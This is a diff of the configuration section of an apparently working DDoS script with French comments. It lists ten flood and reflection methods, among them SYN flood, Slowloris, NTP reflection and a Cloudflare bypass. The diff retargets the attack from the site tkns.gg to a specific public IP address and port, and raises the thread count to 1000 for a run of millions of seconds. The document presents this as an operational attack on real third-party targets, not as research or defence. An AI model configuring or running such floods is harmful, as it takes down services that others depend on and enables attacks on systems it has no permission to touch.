@@ -22,17 +22,17 @@ init(autoreset=True)
 # ⚙️  CONFIGURATION - MODIFIE CES VALEURS AVANT LANCEMENT  ⚙️
 # ═══════════════════════════════════════════════════════════
 
-METHOD = 7              # Méthode d'attaque (1 à 10) :
+METHOD = 1              # Méthode d'attaque (1 à 10) :
                         # 1=UDP Flood          6=NTP Reflection
                         # 2=SYN Flood          7=HTTP Bypass CF
                         # 3=HTTP Flood         8=Layer7 HTTP/1.1
                         # 4=Slowloris          9=Layer7 HTTP/2
                         # 5=RUDY              10=WebSocket Flood
 
-TARGET = "https://tkns.gg/"   # Cible : IP ou URL (ex: "192.168.1.1" ou "http://example.com")
-PORT = 80                       # Port (utilisé pour méthodes 1,2,4,5,6)
+TARGET = "104.29.151.42"   # Cible : IP ou URL (ex: "192.168.1.1" ou "http://example.com")
+PORT = 19333                       # Port (utilisé pour méthodes 1,2,4,5,6)
 DURATION = 6000000                   # Durée en secondes
-THREADS = 300                   # Nombre de threads / concurrence
+THREADS = 1000                   # Nombre de threads / concurrence
 
 # Options spécifiques (selon méthode)
 NTP_SERVER = "0.pool.ntp.org"   # Requis pour méthode 6 (NTP Reflection)
